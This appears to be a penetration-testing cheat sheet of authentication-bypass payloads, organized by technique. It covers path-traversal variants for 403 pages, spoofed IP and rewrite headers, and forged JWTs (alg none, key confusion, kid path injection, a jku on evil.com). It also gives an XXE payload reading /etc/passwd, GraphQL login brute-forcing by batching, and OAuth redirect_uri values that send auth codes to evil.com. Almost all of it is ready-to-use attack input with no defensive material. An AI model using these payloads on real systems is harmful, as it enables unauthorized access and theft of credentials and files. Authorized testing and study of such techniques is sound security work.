# Auth Bypass Payloads — Every Known Technique

## Path Traversal Auth Bypass (403 → 200)
```
# Original blocked: /admin
/admin → 403

# Bypass attempts:
/Admin
/ADMIN
/admin/
/admin/.
/./admin
//admin
/admin..;/
/admin;/
/admin/~
/%2fadmin
/admin%20
/admin%09
/%61dmin
/admin/./
/../admin
/admin/../admin
/.;/admin
/admin?anything
/admin#anything
/admin\
```

## HTTP Method Override
```
# If GET /admin returns 403, try:
X-HTTP-Method-Override: GET
X-Method-Override: GET  
X-HTTP-Method: GET
X-Original-Method: GET

# Method switching
GET  /admin → 403
POST /admin → 200
PUT  /admin → 200
PATCH /admin → 200
```

## Header-Based Auth Bypass
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: localhost
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: localhost
Host: localhost
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Port: 443
X-Forwarded-Scheme: https
```

## JWT Bypass
```
# Algorithm none
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Key confusion (RS256 → HS256)
# Sign with RSA public key as HMAC secret
{"alg":"HS256","typ":"JWT"}  # sign with public key

# Kid injection
{"alg":"HS256","kid":"../../dev/null","typ":"JWT"}  # sign with empty string
{"alg":"HS256","kid":"path/to/known/file","typ":"JWT"}

# JKU/X5U injection
{"alg":"RS256","jku":"https://evil.com/jwks.json"}
```

## API Version Downgrade
```
# v2 has auth, v1 might not:
/api/v2/users  → 401
/api/v1/users  → 200  (forgot to add auth to v1!)
/api/users     → 200  (unversioned endpoint)
/api/v0/users  → 200
/api/beta/users → 200
/api/internal/users → 200
```

## Content-Type Manipulation
```
# App expects JSON but doesn't validate:
Content-Type: application/json  → 401
Content-Type: application/xml   → 200 (different parser, different auth?)
Content-Type: text/plain        → 200
Content-Type: application/x-www-form-urlencoded → 200

# JSON → XML content type confusion for XXE:
Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
```

## GraphQL Auth Bypass
```graphql
# Introspection (often unauthenticatd)
{__schema{types{name,fields{name}}}}

# Batching bypass (rate limit evasion)
[{"query":"mutation{login(user:\"a\",pass:\"1\")}"}, {"query":"mutation{login(user:\"a\",pass:\"2\")}"}]

# Alias enumeration
{
  a1: user(id: 1) { email }
  a2: user(id: 2) { email }
  a3: user(id: 3) { email }
}

# Field suggestions (info leak)
{user{__typename}}
```

## OAuth/OIDC Bypass
```
# redirect_uri manipulation
redirect_uri=https://evil.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com@evil.com
redirect_uri=https://target.com%40evil.com
redirect_uri=https://target.com/.evil.com
redirect_uri=https://target.com/callback?next=https://evil.com

# state parameter missing → CSRF
# No state = attacker can link their OAuth to victim's account

# PKCE downgrade
# Remove code_challenge from authorization request
# If server doesn't enforce → auth code interception
```
